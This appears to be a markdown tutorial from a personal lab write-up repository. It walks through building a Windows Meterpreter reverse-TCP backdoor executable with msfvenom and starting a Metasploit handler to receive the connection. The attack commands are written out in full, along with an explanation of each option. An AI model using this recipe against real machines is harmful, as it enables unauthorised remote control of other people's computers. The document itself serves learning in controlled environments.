### Backdoor Windows Exploitation

In this tutorial we are hacking into a Windows 10 machine creating a backdoor exploit with Metasploit Framework.

This repository is dedicated to show how i go through Hacking challenges. 
Created only for learning pourposes and all the solutions and tricks are used at controlled environments.

#### DO NOT HACK WITHOUT PERMISSION ! 

#### Happy Hacking ðŸ˜ƒ

### Step 01: Start Metasploit

For this i'll be using [Metasploit Framework.](https://www.metasploit.com/)

You can check more about at their website.

So... first let's open metasploit command line interface.

````
msfconsole
````
<img src="screenshot/msfconsole.png" />

### Step 02: Set the backdoor exploit configuration file (.exe)

After that you need to create the file with the backdoor exploiting configuration.

You do it by running the command:

````
msfvenom -p windows/meterpreter/reverse_tcp LHOST-<your-ip> LPORT-<any-port> -f exe -o /path-to-any-directory-you-want/rs_exploit.exe
````
<img src="screenshot/msfvenom.png" />

### But, let's break this command down
 - **msfvenom** is a powerful tool within the Metasploit Framework used for generating payloads.
 - **-p windows/meterpreter/reverse_tcp** creates the payload with the connection you need to the Windows machine.
 - **LHOST-<your-ip>** is the host ip, your machine ip that will receive the targets connection.
 - **LPORT-<any-port>** the port where we want to connect back to the target.
 - **-f exe** because we want to create a executable file.
 - **-o /path-to-any-directory-you-want/rs_exploit.exe** is the output directory.

Ok, so this **created the payload** that will get transferred over to your **Windows** target.

### Step 03: Set Metasploit handler to listen to the remote connection

Now we need to tell **Metasploit** we're gonna use a **Handler**.

We must make sure that **Metasploit** will listen to the connection.

And you can do this by running the following command

````
use exploit/multi/handler
````

<img src="screenshot/handler.png" />


### Step 04: Set the payload type to the Windows interpreter reverse TCP


````
set PAYLOAD windows/meterpreter/reverse_tcp
````

<img src="screenshot/set_payload.png" />

Now you can check this out:

<img src="screenshot/show_options.png" />

As you can see, there's empty **LHOST** and **LPORT**.

You need to set those values in order to make sure Metasploit understands where we are listening for this connection.

Now you can **show options** again:

<img src="screenshot/show_options_02.png" />


### Step 05: Exploit

Now, it's time to run the exploit!!!!!

````
exploit
````
<img src="screenshot/exploit.png" />


This starts the listener, that is waiting for the Windows target's machine connection.
